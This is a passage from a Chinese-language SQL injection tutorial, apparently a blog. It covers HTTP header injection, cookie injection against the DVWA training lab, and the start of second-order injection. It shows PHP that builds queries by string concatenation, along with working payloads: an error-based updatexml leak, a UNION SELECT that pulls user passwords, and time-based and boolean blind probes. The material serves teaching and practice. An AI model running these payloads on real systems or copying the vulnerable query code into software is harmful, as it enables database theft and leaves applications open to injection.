&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE username = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39; AND password = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其实也就是在输入框里填写注入语句就行，也可以抓包后修改&lt;/p&gt;
&lt;h3 id=&#34;http头部参数注入&#34;&gt;http头部参数注入
&lt;/h3&gt;&lt;p&gt;http头部有着许多参数，开发者可能因为记录日志、分析用户行为等目的，从这些参数中获取信息并存入数据库，但过程中没有进行过滤，导致了注入&lt;/p&gt;
&lt;p&gt;这里以最常见的&lt;code&gt;User-Agent&lt;/code&gt;、&lt;code&gt;Referer&lt;/code&gt;、&lt;code&gt;X-Forwarded-For&lt;/code&gt;三个字段举例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$ip&lt;/span&gt;         &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;]; &lt;span style=&#34;color:#7f848e&#34;&gt;// 获取伪造的客户端IP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$user_agent&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;];    &lt;span style=&#34;color:#7f848e&#34;&gt;// 获取浏览器标识
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$referer&lt;/span&gt;    &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;HTTP_REFERER&amp;#39;&lt;/span&gt;];       &lt;span style=&#34;color:#7f848e&#34;&gt;// 获取来源页面
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 漏洞点一：根据IP查询该用户是否在黑名单中
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ip&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM ip_blacklist WHERE ip = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result_ip&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ip&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 漏洞点二：根据浏览器标识，提供定制化内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ua&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM custom_content WHERE user_agent_key = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$user_agent&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result_ua&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql_ua&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;// 漏洞点三：记录访问来源
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql_referer&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM referer_stats WHERE page_url = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$referer&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$result_referer&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql_referer&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;脚本执行完毕。&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;/analytics.php&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; vulnerable-site.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; Mozilla/5.0&amp;#39; AND (updatexml(1,concat(0x7e,(select database())),1))#
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;X-Forwarded-For&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; 127.0.0.1&amp;#39; UNION SELECT 1,user,password FROM users#
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;Referer&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; http://google.com&amp;#39; AND IF(ascii(substring(database(),1,1))&amp;gt;100, sleep(5), 0)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方式和普通注入都是差不多的，核心思想没变&lt;/p&gt;
&lt;h3 id=&#34;cookie注入&#34;&gt;cookie注入
&lt;/h3&gt;&lt;p&gt;从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以dvwa靶场high等级的sql盲注为例，我们先看看源码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;isset&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$_COOKIE&lt;/span&gt;[ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; ] ) ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_COOKIE&lt;/span&gt;[ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt; ];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$getid&lt;/span&gt;  &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; LIMIT 1;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$GLOBALS&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;___mysqli_ston&amp;#34;&lt;/span&gt;],  &lt;span style=&#34;color:#e06c75&#34;&gt;$getid&lt;/span&gt; );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;$num&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_num_rows&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$result&lt;/span&gt; ); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$num&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; ) &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;sleep&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;4&lt;/span&gt; ) );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;header&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;$_SERVER&lt;/span&gt;[ &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span&gt; ] &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; 404 Not Found&amp;#39;&lt;/span&gt; );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ((&lt;span style=&#34;color:#e06c75&#34;&gt;is_null&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$___mysqli_res&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_close&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$GLOBALS&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;___mysqli_ston&amp;#34;&lt;/span&gt;]))) &lt;span style=&#34;color:#56b6c2&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$___mysqli_res&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie&lt;/p&gt;
&lt;p&gt;在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样&lt;/p&gt;
&lt;p&gt;我们点击链接更换新cookie：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and length(database())=4 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;刷新页面&lt;/strong&gt;，页面显示&lt;code&gt;User ID exists in the database.&lt;/code&gt;，说明查询成功了，也就是数据库名称长度为4&lt;/p&gt;
&lt;p&gt;值得注意的是，这段代码里还有这样的一段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;5&lt;/span&gt; ) &lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt; ) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;sleep&lt;/span&gt;( &lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;( &lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d19a66&#34;&gt;4&lt;/span&gt; ) );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;f12开发者工具（应用 -&amp;gt; cookie）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200225693.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701200225693&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;浏览器扩展（比如cookie editor）：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250701200301860.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250701200301860&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;7-二次注入&#34;&gt;#7 二次注入
&lt;/h2&gt;&lt;p&gt;二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据&lt;/p&gt;
&lt;p&gt;我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;用户注册的php：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username_escaped&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;addslashes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$username&lt;/span&gt;); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;INSERT INTO users (username, password) VALUES (&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$username_escaped&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;, &amp;#39;some_password_hash&amp;#39;)&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$conn&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开发者使用了&lt;code&gt;addslashes&lt;/code&gt;对输入进行转义，过滤了可能的危险语句&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修改密码的php：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$current_user&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$new_password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;new_password&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;UPDATE users SET password = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$new_password&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; WHERE username = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$current_user&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开发者觉得从数据库里面取出的数据绝对正确，于是没有对它做任何处理&lt;/p&gt;
